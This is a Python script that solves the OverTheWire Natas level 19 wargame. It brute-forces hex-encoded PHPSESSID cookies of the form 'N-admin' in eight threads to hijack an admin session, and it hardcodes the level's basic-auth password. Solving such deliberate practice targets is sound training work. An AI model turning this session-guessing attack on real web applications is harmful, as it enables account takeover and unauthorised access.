import requests
import binascii
import threading

# Constants
BASE_URL = "http://natas19.natas.labs.overthewire.org"
BASE_USERNAME = "natas19"
BASE_PASSWORD = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"
MAX_SESSION_ID = 640
THREAD_COUNT = 8  # Mimicing thread count on cse machines
RANGE = MAX_SESSION_ID // THREAD_COUNT  # Range for each thread

# Lock the threads until they finish
lock = threading.Lock() 

def brute_force_session_ids(start, end):
    s = requests.Session()
    s.auth = (BASE_USERNAME, BASE_PASSWORD)

    for x in range(start, end):
        tmp = str(x) + "-admin"
        print(f"[Thread {threading.current_thread().name}] Trying session: {tmp}")

        val = binascii.hexlify(tmp.encode('utf-8'))
        cookies = dict(PHPSESSID=val.decode('ascii'))
        response = s.get(BASE_URL, cookies=cookies)

        if "Login as an admin to retrieve" not in response.text:
            with lock:
                print(response.text)
                # Terminate all threads if one thread finds the admin session
                exit(0)

# Thread handler
threads = []
for i in range(THREAD_COUNT):
    start_range = i * RANGE
    end_range = (i + 1) * RANGE
    t = threading.Thread(target=brute_force_session_ids, args=(start_range, end_range), name=f'Thread-{i+1}')
    threads.append(t)
    t.start()

# Wait for all threads to finish
for t in threads:
    t.join()

print("Finished brute-forcing.")
